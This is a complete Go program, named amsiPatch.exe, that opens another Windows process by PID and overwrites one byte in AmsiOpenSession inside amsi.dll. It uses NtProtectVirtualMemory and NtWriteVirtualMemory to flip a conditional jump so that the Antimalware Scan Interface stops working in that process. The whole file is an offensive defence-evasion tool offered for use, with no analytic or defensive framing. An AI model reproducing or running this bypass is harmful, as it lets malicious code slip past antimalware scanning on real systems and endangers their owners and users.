package main

import (
	"fmt"
	"golang.org/x/sys/windows"
	"os"
	"strconv"
	"unsafe"
)

var (
	ntdll                  = windows.NewLazyDLL("ntdll.dll")
	ntProtectVirtualMemory = ntdll.NewProc("NtProtectVirtualMemory")
	ntWriteVirtualMemory   = ntdll.NewProc("NtWriteVirtualMemory")
	amsi                   = windows.NewLazyDLL("amsi.dll")
	amsiOpenSession        = amsi.NewProc("AmsiOpenSession")
)

func getAddr(addr uintptr) uintptr {
	for i := 0; i < 1024; i++ {
		if *( *byte )( unsafe.Pointer( addr + uintptr( i ) ) ) == 0x74 {
			return addr + uintptr(i)
		}
	}
	return 0
}

func main() {
	if len(os.Args) != 2 {
		fmt.Println("USAGE: amsiPatch.exe <PID>")
		return
	}

	pid, err := strconv.Atoi(os.Args[1])
	if err != nil {
		fmt.Println("[!] Invalid PID")
		return
	}

	hProc, err := windows.OpenProcess(windows.PROCESS_VM_OPERATION|windows.PROCESS_VM_WRITE, false, uint32(pid))
	if err != nil {
		fmt.Printf("[!] Failed in OpenProcess (%v)\n", err)
		return
	}
	defer windows.CloseHandle(hProc)
	AMS1patch(hProc)
}

func AMS1patch(hProc windows.Handle) 
{
	patch := []byte{0x75}

	var OldProtect uint32
	var memPage uintptr = 0x1000
	ptraddr2 := getAddr(amsiOpenSession.Addr())

	var retSize uintptr
	_, _, err := ntProtectVirtualMemory.Call(
		uintptr(hProc),
		uintptr(unsafe.Pointer(&ptraddr2)),
		uintptr(unsafe.Pointer(&memPage)),
		windows.PAGE_EXECUTE_READWRITE,
		uintptr(unsafe.Pointer(&OldProtect)),
	)
	fmt.Println("[!] NtProtectVirtualMemory :", err)

	_, _, err = ntWriteVirtualMemory.Call(
		uintptr(hProc),
		getAddr(amsiOpenSession.Addr()),
		uintptr(unsafe.Pointer(&patch[0])),
		uintptr(len(patch)),
		uintptr(unsafe.Pointer(&retSize)),
	)
	fmt.Println("[!] NtWriteVirtualMemory :", err)

	_, _, err = ntProtectVirtualMemory.Call(
		uintptr(hProc),
		uintptr(unsafe.Pointer(&ptraddr2)),
		uintptr(unsafe.Pointer(&memPage)),
		uintptr(OldProtect),
		uintptr(unsafe.Pointer(&OldProtect)),
	)
	fmt.Println("[!] NtProtectVirtualMemory :", err)
	fmt.Println("[+] Amsi patched")
}
